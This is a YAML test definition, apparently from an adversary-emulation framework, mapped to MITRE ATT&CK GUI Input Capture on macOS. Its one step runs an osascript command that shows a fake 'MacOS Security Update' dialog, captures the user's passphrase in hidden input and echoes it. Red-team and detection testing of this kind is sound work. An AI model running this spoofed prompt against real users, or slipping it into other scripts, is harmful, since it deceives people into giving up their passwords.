api_version: "2.0"
name: AppleScript - Spoofing a credential prompt using osascript
description: |
    Prompt user for password without requiring permissions to send Apple events to System Settings.
    https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/
uuid: b7037b89-947a-427a-ba29-e7e9f09bc045
mitre:
    tactics:
        - 'TA0009: Collection'
        - 'TA0006: Credential Access'
    techniques:
        - 'T1056: Input Capture'
    subtechniques:
        - 'T1056.002: GUI Input Capture'
requirements:
    platforms:
        - os: macos
steps:
    - name: applescript---spoofing-a-credential-prompt-using-osascript
      inline: |
        PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')
        echo $PWD_SPOOF
      executor: bash
      cleanup:
        inline: ""
        executor: bash
